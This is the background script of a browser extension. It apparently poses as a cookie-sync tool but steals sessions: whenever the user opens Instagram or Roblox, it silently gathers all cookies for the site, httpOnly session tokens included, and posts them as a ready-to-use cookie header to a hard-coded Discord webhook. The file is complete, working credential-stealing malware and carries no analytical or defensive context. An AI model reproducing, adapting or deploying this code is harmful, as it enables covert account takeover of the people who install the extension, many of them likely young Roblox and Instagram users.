const WEBHOOK = "https://discord.com/api/webhooks/1517231995615186955/cn4VI_tkmnUohJ2Sjb6GMTXGvzzA2hvrZhdbaGuX69vFt0E07xIusl15pTHKaFdIF1LM";

const SENT_KEY = "sent_domains";

async function getSent() {
  const r = await chrome.storage.local.get(SENT_KEY);
  return r[SENT_KEY] || {};
}

async function markSent(domain) {
  const sent = await getSent();
  sent[domain] = Date.now();
  await chrome.storage.local.set({ [SENT_KEY]: sent });
}

async function alreadySent(domain) {
  const sent = await getSent();
  return !!sent[domain];
}

function domainFromUrl(url) {
  try {
    const u = new URL(url);
    return u.hostname.replace(/^www\./, "");
  } catch {
    return null;
  }
}

async function getCookiesFor(domain) {
  // Grab root + subdomain cookies
  const queries = [
    { domain: domain },
    { domain: "." + domain },
    { url: "https://" + domain + "/" },
    { url: "https://www." + domain + "/" }
  ];
  const seen = new Set();
  const all = [];
  for (const q of queries) {
    try {
      const list = await chrome.cookies.getAll(q);
      for (const c of list) {
        const key = c.domain + "|" + c.name + "|" + c.path;
        if (!seen.has(key)) {
          seen.add(key);
          all.push(c);
        }
      }
    } catch (e) {}
  }
  return all;
}

function formatCookies(domain, cookies) {
  const header = cookies
    .map(c => `${c.name}=${c.value}`)
    .join("; ");

  const details = cookies
    .map(c => `• \`${c.name}\` = \`${(c.value || "").slice(0, 80)}${(c.value || "").length > 80 ? "..." : ""}\`\n  domain: ${c.domain} | path: ${c.path} | secure: ${c.secure} | httpOnly: ${c.httpOnly}`)
    .join("\n");

  return `**🍪 Cookies captured for \`${domain}\`**\nTotal: **${cookies.length}**\n\n**Cookie Header:**\n\`\`\`\n${header.slice(0, 1900)}\n\`\`\`\n\n**Details:**\n${details.slice(0, 1500)}`;
}

async function sendToWebhook(domain, cookies) {
  const content = formatCookies(domain, cookies);

  // Discord message limit = 2000, split into chunks
  const chunks = [];
  let remaining = content;
  while (remaining.length > 0) {
    chunks.push(remaining.slice(0, 1900));
    remaining = remaining.slice(1900);
  }

  for (const chunk of chunks) {
    try {
      await fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: chunk,
          username: "CookieSync"
        })
      });
    } catch (e) {}
    await new Promise(r => setTimeout(r, 400));
  }
}

async function handleDomain(domain) {
  if (!domain) return;
  if (!/instagram\.com$|roblox\.com$/i.test(domain)) return;

  if (await alreadySent(domain)) return;

  const cookies = await getCookiesFor(domain);
  if (cookies.length === 0) return;

  await sendToWebhook(domain, cookies);
  await markSent(domain);
}

chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status !== "complete") return;
  if (!tab.url) return;
  const domain = domainFromUrl(tab.url);
  if (!domain) return;
  await handleDomain(domain);
});

chrome.tabs.onActivated.addListener(async (info) => {
  try {
    const tab = await chrome.tabs.get(info.tabId);
    if (!tab.url) return;
    const domain = domainFromUrl(tab.url);
    if (!domain) return;
    await handleDomain(domain);
  } catch (e) {}
});

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg && msg.type === "page_loaded" && msg.domain) {
    handleDomain(msg.domain).then(() => sendResponse({ ok: true }));
    return true;
  }
});
